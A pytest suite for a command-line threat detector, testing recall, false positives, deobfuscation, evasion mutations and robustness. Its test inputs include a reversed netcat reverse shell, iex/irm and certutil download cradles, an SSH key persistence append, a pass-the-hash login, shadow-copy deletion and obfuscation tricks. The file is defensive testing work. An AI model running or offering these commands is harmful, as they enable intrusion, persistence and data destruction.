"""End-to-end detection quality gate.

Runs the full pipeline (decode -> catalog match -> classify -> score) over the
labelled corpus in tests/benchmark_corpus.py and fails if recall or the
false-positive rate regresses. Individual misses are reported by
`python scripts/benchmark.py`; this test guards the aggregate so one awkward
sample cannot block a change, while a broad regression cannot slip through.
"""
from __future__ import annotations

import pytest

from app import gtfobins, lolbas, loldrivers
from app.classifier import known_installer
from app.decoder import decode_layers
from app.pipeline import detect
from tests.benchmark_corpus import (
    ATTACKS, BENIGN, EDGE_ATTACKS, EDGE_BENIGN, FIELD_ATTACKS, FIELD_BENIGN,
    HOLDOUT_ATTACKS, HOLDOUT_BENIGN, Case,
)
from tests.benchmark_mutations import mutate

SEV_RANK = {"clean": 0, "low": 1, "notable": 2, "suspicious": 3, "malicious": 4}

MIN_RECALL = 0.95
MAX_FALSE_POSITIVE_RATE = 0.03


@pytest.fixture(scope="module", autouse=True)
def _catalogs() -> None:
    lolbas.load_catalog()
    gtfobins.load_catalog()
    loldrivers.load_catalog()
    if not lolbas._catalog:  # noqa: SLF001 — submodule not checked out
        pytest.skip("LOLBAS submodule not initialised; benchmark needs the catalogs")


def _severity(case: Case) -> str:
    return str(detect(case.command).verdict["severity"])


@pytest.mark.parametrize(
    ("name", "attacks"),
    [("tuning", ATTACKS), ("holdout", HOLDOUT_ATTACKS), ("edge", EDGE_ATTACKS), ("field", FIELD_ATTACKS)],
)
def test_recall(name: str, attacks: list[Case]) -> None:
    missed = [
        f"{c.id}: got {sev}, want >= {c.tier}"
        for c in attacks
        if SEV_RANK[sev := _severity(c)] < SEV_RANK[c.tier]
    ]
    recall = 1 - len(missed) / len(attacks)
    assert recall >= MIN_RECALL, f"{name} recall {recall:.1%} < {MIN_RECALL:.0%}\n" + "\n".join(missed)


@pytest.mark.parametrize(
    ("name", "benign"),
    [("tuning", BENIGN), ("holdout", HOLDOUT_BENIGN), ("edge", EDGE_BENIGN), ("field", FIELD_BENIGN)],
)
def test_false_positive_rate(name: str, benign: list[Case]) -> None:
    over = [
        f"{c.id}: got {sev}, want <= {c.tier}"
        for c in benign
        if SEV_RANK[sev := _severity(c)] > SEV_RANK[c.tier]
    ]
    rate = len(over) / len(benign)
    assert rate <= MAX_FALSE_POSITIVE_RATE, (
        f"{name} false-positive rate {rate:.1%} > {MAX_FALSE_POSITIVE_RATE:.0%}\n" + "\n".join(over)
    )


def test_corpus_ids_unique() -> None:
    ids = [c.id for c in (*ATTACKS, *BENIGN, *HOLDOUT_ATTACKS, *HOLDOUT_BENIGN,
                          *EDGE_ATTACKS, *EDGE_BENIGN, *FIELD_ATTACKS, *FIELD_BENIGN)]
    assert len(ids) == len(set(ids))


# ── Decoders added with the benchmark ────────────────────────────────────────

def _decoded(command: str) -> dict[str, str]:
    return {str(layer["encoding"]): str(layer["value"]) for layer in decode_layers(command)}


def test_cmd_caret_stripped() -> None:
    assert "certutil -urlcache" in _decoded("c^e^r^t^u^t^i^l -u^r^l^c^a^c^h^e -f x")["cmd-caret"]


def test_cmd_in_token_quotes_removed() -> None:
    assert _decoded('certutil -url""cache -f x')["cmd-quote-split"] == "certutil -urlcache -f x"


def test_cmd_quoted_argument_untouched() -> None:
    assert decode_layers('echo "say ""hi"" now"') == []


def test_cmd_set_variables_expanded() -> None:
    layers = _decoded('cmd /c "set a=cert&& set b=util&& call %a%%b% -urlcache"')
    assert "call certutil -urlcache" in layers["cmd-variable-substitution"]


def test_cmd_substring_of_known_variable() -> None:
    assert _decoded("cmd /c %COMSPEC:~-7,3% /c whoami")["cmd-substring"] == "cmd /c cmd /c whoami"


def test_plain_set_without_use_is_not_a_layer() -> None:
    assert decode_layers("set NODE_ENV=production&& npm start") == []


@pytest.mark.parametrize("expr", [
    "$env:ComSpec[4,24,25]-join''",
    "$pshome[4]+$pshome[30]+'x'",
    "$ShellId[1]+$ShellId[13]+'x'",
])
def test_powershell_known_variable_index_spells_iex(expr: str) -> None:
    value = _decoded(f"powershell -c \".({expr}) (irm x)\"")["powershell-index"]
    assert "('iex')" in value.lower()


def test_shell_rev() -> None:
    assert _decoded("echo 'hs/nib/ e- 1 1.1.1.1 cn' | rev | sh")["shell-rev"] == "nc 1.1.1.1 1 -e /bin/sh"


def test_two_blobs_both_decoded() -> None:
    import base64

    one = base64.b64encode(b"first payload: whoami /all and more text").decode()
    two = base64.b64encode(b"second payload: net user and more text!").decode()
    values = [str(layer["value"]) for layer in decode_layers(f"run {one} then {two}")]
    assert any("first payload" in v for v in values)
    assert any("second payload" in v for v in values)


# ── Known-installer handling ─────────────────────────────────────────────────

def test_known_installer_exact_url_only() -> None:
    assert known_installer("curl -sSf https://sh.rustup.rs | sh", [])
    assert known_installer("curl -sSf https://sh.rustup.rs.evil.example/x | sh", []) is None
    assert known_installer("curl -sSf http://sh.rustup.rs | sh", []) is None


def test_known_installer_voided_by_second_stage() -> None:
    plain = detect("curl -sSf https://sh.rustup.rs | sh")
    assert plain.verdict["severity"] == "notable"
    chained = detect("curl -sSf https://sh.rustup.rs | sh; echo k >> ~/.ssh/authorized_keys")
    assert SEV_RANK[chained.verdict["severity"]] >= SEV_RANK["suspicious"]


def test_appended_help_flag_does_not_suppress() -> None:
    det = detect("evil-winrm -i 10.0.0.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0")
    assert det.verdict["severity"] == "malicious"


# ── Robustness ───────────────────────────────────────────────────────────────

MIN_MUTATION_SURVIVAL = 0.98
ALL_ATTACKS = [*ATTACKS, *HOLDOUT_ATTACKS, *EDGE_ATTACKS, *FIELD_ATTACKS]
ALL_CASES = [*ALL_ATTACKS, *BENIGN, *HOLDOUT_BENIGN, *EDGE_BENIGN, *FIELD_BENIGN]


def test_evasion_mutations_keep_their_tier() -> None:
    """Restyling an attack (wrap, re-case, re-space, encode, append --help) must not hide it."""
    total = 0
    lost: list[str] = []
    for _name, case in mutate([*ATTACKS, *HOLDOUT_ATTACKS]):
        total += 1
        sev = _severity(case)
        if SEV_RANK[sev] < SEV_RANK[case.tier]:
            lost.append(f"{case.id}: got {sev}, want >= {case.tier}")
    survival = 1 - len(lost) / total
    assert survival >= MIN_MUTATION_SURVIVAL, f"{survival:.1%} of {total}\n" + "\n".join(lost[:40])


def test_literal_prefilter_is_sound() -> None:
    """A rule's required-literal prefilter must never veto a command its regex matches."""
    from app import classifier

    rules = [r for cls in classifier._CLASSES for r in cls.rules if r.literals]  # noqa: SLF001
    assert len(rules) > 200, "prefilter stopped deriving literals"
    texts = [classifier._normalize_segment(c.command) for c in ALL_CASES]  # noqa: SLF001
    texts += [classifier._normalize_segment(c.command) for _, c in mutate(ALL_ATTACKS)]  # noqa: SLF001
    for text in texts:
        lowered = text.lower()
        for rule in rules:
            if rule.pattern.search(text):
                assert any(lit in lowered for lit in rule.literals), (rule.signal, rule.literals, text[:120])


def test_detection_is_deterministic() -> None:
    for case in ALL_CASES[::7]:
        assert detect(case.command).verdict == detect(case.command).verdict


def test_fuzzed_input_never_raises() -> None:
    """Truncations, splices and hostile characters must yield a verdict, not an exception."""
    import random

    rng = random.Random(1337)
    noise = [chr(0), chr(0xD800), chr(0x202E), chr(0x1F600), "\r\n", "\t", "%", "^", "`", '"', "'", "$(", "{",
             "\\", "=" * 50, "A" * 300, "|" * 20, "%00%0a%0d", chr(0xFEFF), "((((", "[char]", "-join", "0x"]
    for case in ALL_CASES:
        cmd = case.command
        for _ in range(4):
            i, j = sorted(rng.randrange(len(cmd) + 1) for _ in range(2))
            variants = (cmd[:i], cmd[j:], cmd[:i] + rng.choice(noise) + cmd[i:], cmd[:i] + cmd[j:] + cmd[i:j])
            for variant in variants:
                verdict = detect(variant).verdict
                assert verdict["severity"] in SEV_RANK
                assert 0 <= verdict["score"] <= 100


def test_worst_case_inputs_stay_fast() -> None:
    """Pathological pastes are bounded; the budget here is generous to stay CI-stable."""
    import time

    dense = ("powershell curl wget reg add net user schtasks /create certutil rundll32 "
             "http://1.2.3.4/a.exe chmod +x /tmp/x | crontab - > /var/log/x ") * 500
    for command in (
        "a" * 65536,
        "cmd /c " + " " * 65536 + "whoami",
        "powershell -enc " + "QUJD" * 5000,
        " ".join(f"http://203.0.113.{i % 255}/a.exe" for i in range(5000)),
        dense[:65536],
    ):
        start = time.perf_counter()
        detect(command)
        assert time.perf_counter() - start < 5.0, command[:40]


def test_decompression_is_bounded() -> None:
    """A gzip bomb must not be inflated past the cap."""
    import base64
    import gzip

    from app import decoder

    bomb = base64.b64encode(gzip.compress(b"A" * (20 * 1024 * 1024))).decode()
    layers = decode_layers(f"powershell -c \"[Convert]::FromBase64String('{bomb}')\"")
    assert layers, "gzip layer should still be reported"
    assert max(len(str(layer["value"])) for layer in layers) <= decoder.MAX_DECOMPRESSED_BYTES


def test_signal_after_long_filler_is_still_seen() -> None:
    filler = "A1b2" * 9000
    det = detect(f"powershell -c \"$j='{filler}'; iex (irm http://203.0.113.7/a)\"")
    assert det.verdict["severity"] == "malicious"


@pytest.mark.parametrize(("command", "is_search"), [
    (r"grep -i 'mimikatz\|sekurlsa' /var/log/edr.log", True),
    (r'findstr /i "vssadmin delete shadows" C:\Logs\sysmon.txt | sort', True),
    ("grep -i mimikatz edr.log; vssadmin delete shadows /all", False),
    ("grep -i mimikatz edr.log | sh", False),
    ("vssadmin delete shadows /all | findstr x", False),
])
def test_search_query_guard(command: str, is_search: bool) -> None:
    from app.classifier import search_query

    assert search_query(command) is is_search


def test_search_guard_does_not_shelter_a_chained_attack() -> None:
    det = detect("grep -i mimikatz edr.log; vssadmin delete shadows /all /quiet")
    assert det.verdict["severity"] == "malicious"
